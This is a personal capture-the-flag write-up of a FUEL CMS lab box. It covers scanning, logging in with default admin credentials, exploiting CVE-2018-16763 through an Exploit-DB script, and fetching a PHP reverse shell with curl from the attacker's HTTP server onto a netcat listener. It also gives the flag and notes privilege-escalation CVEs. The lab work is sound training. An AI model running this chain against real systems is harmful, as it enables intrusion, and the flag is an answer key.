# Vulnerability Capstone

Notes on the CTF

### nmap

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-21 19:07 UTC
Nmap scan report for ip-10-10-163-53.eu-west-1.compute.internal (10.10.163.53)
Host is up (0.00043s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e66ec8415a08c3c36b1ab1ae1ffa68eb (RSA)
|   256 db8cb577b6a9b05389f98c5d9b8c2e87 (ECDSA)
|_  256 f2e213b5c63e3fa60291c83b01b63277 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Welcome to FUEL CMS
| http-robots.txt: 1 disallowed entry 
|_/fuel/
MAC Address: 02:25:39:11:41:17 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=7/21%OT=22%CT=1%CU=31038%PV=Y%DS=1%DC=D%G=Y%M=022539%T
OS:M=64BAD784%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=105%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11N
OS:W7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F
OS:4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.43 ms ip-10-10-163-53.eu-west-1.compute.internal (10.10.163.53)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.83 seconds
```
### gobuster
```
/!res                 (Status: 400) [Size: 1134]
/!_images             (Status: 400) [Size: 1134]
/.bash_history        (Status: 403) [Size: 277]
/.cvs                 (Status: 403) [Size: 277]
/.history             (Status: 403) [Size: 277]
/!backup              (Status: 400) [Size: 1134]
/.htaccess            (Status: 403) [Size: 277]
/.listing             (Status: 403) [Size: 277]
/!images              (Status: 400) [Size: 1134]
/.passwd              (Status: 403) [Size: 277]
/.bashrc              (Status: 403) [Size: 277]
/.profile             (Status: 403) [Size: 277]
/.rhosts              (Status: 403) [Size: 277]
/!textove_diskuse     (Status: 400) [Size: 1134]
/.cvsignore           (Status: 403) [Size: 277]
/.ssh                 (Status: 403) [Size: 277]
/.subversion          (Status: 403) [Size: 277]
/.web                 (Status: 403) [Size: 277]
/!_archives           (Status: 400) [Size: 1134]
/!                    (Status: 400) [Size: 1134]
/.svn                 (Status: 403) [Size: 277]
/.forward             (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.perf                (Status: 403) [Size: 277]
/!ut                  (Status: 400) [Size: 1134]
/0                    (Status: 200) [Size: 16463]
/@                    (Status: 400) [Size: 1134]
/[                    (Status: 400) [Size: 1134]
/]                    (Status: 400) [Size: 1134]
/asdfjkl;             (Status: 400) [Size: 1134]
/assets               (Status: 301) [Size: 313] [--> http://10.10.163.53/assets/]
/fixed!               (Status: 400) [Size: 1134]
/home                 (Status: 200) [Size: 16463]
/index                (Status: 200) [Size: 16463]
/lost+found           (Status: 400) [Size: 1134]
/offline              (Status: 200) [Size: 70]
/plain]               (Status: 400) [Size: 1134]
/quote]               (Status: 400) [Size: 1134]
/robots.txt           (Status: 200) [Size: 30]
/server-status        (Status: 403) [Size: 277]
/sitemap_xml          (Status: 200) [Size: 398]
Progress: 20216 / 20470 (98.76%)===============================================================
2023/07/21 22:16:07 Finished
===============================================================
```


### website

http://10.10.163.53/robots.txt

```
User-agent: *
Disallow: /fuel/
```

http://10.10.163.53/fuel/ opens a login prompt

use `admin:admin`.




Fuel CMS v 1.4

CVE 2018-16763

https://www.exploit-db.com/exploits/50477

`└─# python 50477.py -u 10.10.163.53`

`Enter Command $echo "hello" > file.php` creates http://10.10.163.53/file.php with contents `hello`.

### reverse shell


Copy https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php into shell.php


`└─# nc -nvlp 9001`

`└─# python -m http.server`

`Enter Command $curl 10.10.254.67:8000/shell.php > file.php`

http://10.10.163.53/file.php


https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal


**THM{ACKME_BLOG_HACKED}**

### getting root... or not?

https://linpeas.sh/ and follow instructions on https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

`Vulnerable to CVE-2021-4034`


No c compilers... make not installed...


Possibly vulnerable to CVE-2021-3156?


I had to look back at the challenge, and I realized the goal is actually just to get to a user flag... after 4 hours of trying to get root. I looked online and didn't see any writeups that got root, which is disappointing. Maybe I will open this up again and see if I can escalate further.
